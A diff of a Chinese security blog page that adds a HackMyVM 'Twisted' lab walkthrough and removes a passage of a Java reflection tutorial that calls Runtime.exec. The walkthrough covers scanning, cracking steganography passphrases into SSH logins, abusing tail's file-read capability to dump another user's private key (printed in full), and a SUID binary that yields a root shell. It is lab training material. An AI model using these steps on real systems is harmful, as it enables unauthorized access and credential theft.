@@ -185,6 +185,126 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/01/24/HackmyVM-Twisted/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/24/HackmyVM-Twisted/" class="post-title-link" itemprop="url">HackmyVM-Twisted</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-24 15:12:50 / 修改时间：15:24:18" itemprop="dateCreated datePublished" datetime="2025-01-24T15:12:50+08:00">2025-01-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id><a href="#" class="headerlink" title></a></h1><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class="line">192.168.31.22   08:00:27:63:fe:59       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class="line">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
+
+<p>ip为192.168.31.22.  nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.22 --min-rate=1000 -p-</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 02:14 EST</span><br><span class="line">Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 95.30% done; ETC: 02:15 (0:00:01 remaining)</span><br><span class="line">Nmap scan report for twisted (192.168.31.22)</span><br><span class="line">Host is up (0.0065s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">2222/tcp open  EtherNetIP-1</span><br><span class="line">MAC Address: 08:00:27:63:FE:59 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 22.61 seconds</span><br></pre></td></tr></table></figure>
+
+<p>2222端口为ssh端口</p>
+<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# curl 192.168.31.22</span><br><span class="line">&lt;h1&gt;I love cats!&lt;/h1&gt;</span><br><span class="line">&lt;img src=&quot;cat-original.jpg&quot; alt=&quot;Cat original&quot;  width=&quot;400&quot; height=&quot;400&quot;&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;But I prefer this one because seems different&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;cat-hidden.jpg&quot; alt=&quot;Cat Hidden&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>80端口存在两张jpg图片</p>
+<p>下载下了用stegseek查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# stegseek cat-original.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;westlife&quot;</span><br><span class="line">[i] Original filename: &quot;markus.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;cat-original.jpg.out&quot;.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# stegseek cat-hidden.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;sexymama&quot;</span><br><span class="line">[i] Original filename: &quot;mateo.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;cat-hidden.jpg.out&quot;.</span><br></pre></td></tr></table></figure>
+
+<p>给了两个ssh的账号密码</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>先登录markus</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">markus@MiWiFi-RA71-srv:~$ cat note.txt</span><br><span class="line">Hi bonita,</span><br><span class="line">I have saved your id_rsa here: /var/cache/apt/id_rsa</span><br><span class="line">Nobody can find it.</span><br></pre></td></tr></table></figure>
+
+<p>给了一个提示，是bonita用户的id_rsa</p>
+<p>suid提权看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">markus@MiWiFi-RA71-srv:~$ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">/home/bonita/beroot</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>
+
+<p><code>/home/bonita/beroot</code>这个很可疑但是没有权限，登录mateo看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mateo@MiWiFi-RA71-srv:~$ cat note.txt</span><br><span class="line">/var/www/html/gogogo.wav</span><br></pre></td></tr></table></figure>
+
+<p>下载下了，用Audacity查看，能发现这是莫斯，解码得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GO DEEPER... COME WITH ME... LITTLE RABBIT...</span><br></pre></td></tr></table></figure>
+
+<p>没啥用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mateo@MiWiFi-RA71-srv:~$ /usr/sbin/getcap -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/tail = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure>
+
+<p>getcap可以查看文件的特殊权限，tail可以读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mateo@MiWiFi-RA71-srv:~$ tail /var/cache/apt/id_rsa -n 100</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd</span><br><span class="line">FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS</span><br><span class="line">olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1</span><br><span class="line">vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF</span><br><span class="line">gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C</span><br><span class="line">tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM</span><br><span class="line">gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC</span><br><span class="line">xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8</span><br><span class="line">DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H</span><br><span class="line">uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD</span><br><span class="line">XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu</span><br><span class="line">U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI</span><br><span class="line">mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/</span><br><span class="line">hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro</span><br><span class="line">nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK</span><br><span class="line">mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+</span><br><span class="line">bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq</span><br><span class="line">yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP</span><br><span class="line">UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh</span><br><span class="line">V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ</span><br><span class="line">LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz</span><br><span class="line">a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF</span><br><span class="line">eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu</span><br><span class="line">D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>ssh登陆，将beroot下载ida分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [rsp+1Ch] [rbp-4h] BYREF</span><br><span class="line"></span><br><span class="line">  printf(&quot;Enter the code:\n &quot;);</span><br><span class="line">  scanf(&quot;%i&quot;, &amp;v4);</span><br><span class="line">  if ( v4 == 5880 )</span><br><span class="line">  &#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    system(&quot;/bin/bash&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;\nWRONG&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要输入等于5880就会执行/bin/bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bonita@MiWiFi-RA71-srv:~$ ./beroot</span><br><span class="line">Enter the code:</span><br><span class="line"> 5880</span><br><span class="line">root@MiWiFi-RA71-srv:~#</span><br></pre></td></tr></table></figure>
+
+<p>提权结束</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/01/24/HackmyVM-VulnY/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1196,158 +1316,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2024/05/31/java%E5%8F%8D%E5%B0%84/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/05/31/java%E5%8F%8D%E5%B0%84/" class="post-title-link" itemprop="url">java反射</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-05-31 08:44:30" itemprop="dateCreated datePublished" datetime="2024-05-31T08:44:30+08:00">2024-05-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-06-01 14:27:48" itemprop="dateModified" datetime="2024-06-01T14:27:48+08:00">2024-06-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/JAVA/" itemprop="url" rel="index"><span itemprop="name">JAVA</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>8.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>8 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h2><p>反射是大多数语言都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将 Java 这种静态语⾔附加上动态特性。</p>
-<h2 id="Java反射组成相关的类"><a href="#Java反射组成相关的类" class="headerlink" title="Java反射组成相关的类"></a>Java反射组成相关的类</h2><p>java.lang.Class：类对象;</p>
-<p>java.lang.reflect.Constructor：类的构造器对象;</p>
-<p>java.lang.reflect.Field：类的属性对象;</p>
-<p>java.lang.reflect.Method：类的方法对象;</p>
-<h2 id="实例化对象的方法"><a href="#实例化对象的方法" class="headerlink" title="实例化对象的方法"></a>实例化对象的方法</h2><h4 id="实例化对象的getClass-方法"><a href="#实例化对象的getClass-方法" class="headerlink" title="实例化对象的getClass()方法"></a>实例化对象的getClass()方法</h4><p>如果上下⽂中存在某个类的实例 <code>obj</code>，那么我们可以通过 <code>obj.getClass</code> 来获取它的类。</p>
-<h4 id="使用类的-class-方法"><a href="#使用类的-class-方法" class="headerlink" title="使用类的 .class 方法"></a>使用类的 .class 方法</h4><p>如果你已经加载了某个类，只是想获取到它的 <code>java.lang.Class</code> 对象，那么就直接拿它的 <code>class</code> 属性即可。这个⽅法其实不属于反射。</p>
-<h4 id="Class-forName-String-className-：动态加载类"><a href="#Class-forName-String-className-：动态加载类" class="headerlink" title="Class.forName(String className)：动态加载类"></a>Class.forName(String className)：动态加载类</h4><p>如果你知道某个类的名字，想获取到这个类，就可以使⽤ <code>forName</code> 来获取，后续要利用的话是需要实例化的。</p>
-<h2 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h2><p>获取成员变量Field位于 <code>java.lang.reflect.Field</code> 包中</p>
-<p>Field[] getFields() ：获取所有 public 修饰的成员变量</p>
-<p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p>
-<p>Field getField(String name) 获取指定名称的 public 修饰的成员变量</p>
-<p>Field getDeclaredField(String name) 获取指定的成员变量</p>
-<h2 id="获取成员方法-Method"><a href="#获取成员方法-Method" class="headerlink" title="获取成员方法 Method"></a>获取成员方法 Method</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Method <span class="title function_">getMethod</span><span class="params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="comment">//返回该类所声明的public方法</span></span><br><span class="line"></span><br><span class="line">Method <span class="title function_">getDeclaredMethod</span><span class="params">(String name, 类&lt;?&gt;... parameterTypes)</span> <span class="comment">//返回该类所声明的所有方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</span></span><br><span class="line"></span><br><span class="line">Method[] getMethods() <span class="comment">//获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法</span></span><br><span class="line"></span><br><span class="line">Method[] getDeclaredMethods() <span class="comment">// 获取该类中的所有方法</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="获取构造函数-Constructor"><a href="#获取构造函数-Constructor" class="headerlink" title="获取构造函数 Constructor"></a>获取构造函数 Constructor</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] getConstructors() ：只返回<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getConstructor(类&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的<span class="keyword">public</span>构造函数</span><br><span class="line"></span><br><span class="line">Constructor&lt;&gt; getDeclaredConstructor(类&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数</span><br></pre></td></tr></table></figure>
-
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>获取 class 实例 之后</p>
-<ul>
-<li>获取类名：<code>forName()</code></li>
-<li>创建对应类型的实例：<code>newInstance()</code></li>
-<li>获取字段的值：<code>get()</code>、设置字段的值：<code>set()</code></li>
-<li>获取方法：<code>getMethod()</code>、调用方法：<code>invoke()</code></li>
-</ul>
-<hr>
-<p>基本知识就是这些，如何执行命令呢，举个例子</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalReflectionCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//创建一个runtime的方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">c2</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//获取getRuntime的方法</span></span><br><span class="line">        c2.setAccessible(<span class="literal">true</span>);<span class="comment">//使getRuntime可访问，因为getRuntime是私有属性</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> c2.invoke(<span class="literal">null</span>);<span class="comment">//调用静态方法，无需实例</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,String.class);<span class="comment">//获取exec方法</span></span><br><span class="line">        m1.invoke(o1,<span class="string">&quot;calc&quot;</span>);<span class="comment">//弹计算器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这是调用静态方法，不需要实例</p>
-<p>当然也可以实现一个新实例</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FinalReflectionCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//获取Runtime的Class对象</span></span><br><span class="line">        Constructor c2=c1.getDeclaredConstructor();<span class="comment">//获取Runtime类的无参构造函数</span></span><br><span class="line">        c2.setAccessible(<span class="literal">true</span>);<span class="comment">//使getRuntime可访问</span></span><br><span class="line">        Object c3=c2.newInstance();<span class="comment">//创建Runtime的新实例</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c1.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(c3,<span class="string">&quot;calc&quot;</span>);<span class="comment">//弹计算器</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/05/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-02-Java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE%E5%88%86%E6%9E%90/#0x08-%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8">Java反序列化基础篇-02-Java反射与URLDNS链分析</a>参考链接，写的很清晰</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/noKing/p/9038234.html#/">Java反射</a></p>
-<hr>
-<h2 id="Java反射修改字段"><a href="#Java反射修改字段" class="headerlink" title="Java反射修改字段"></a>Java反射修改字段</h2><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> 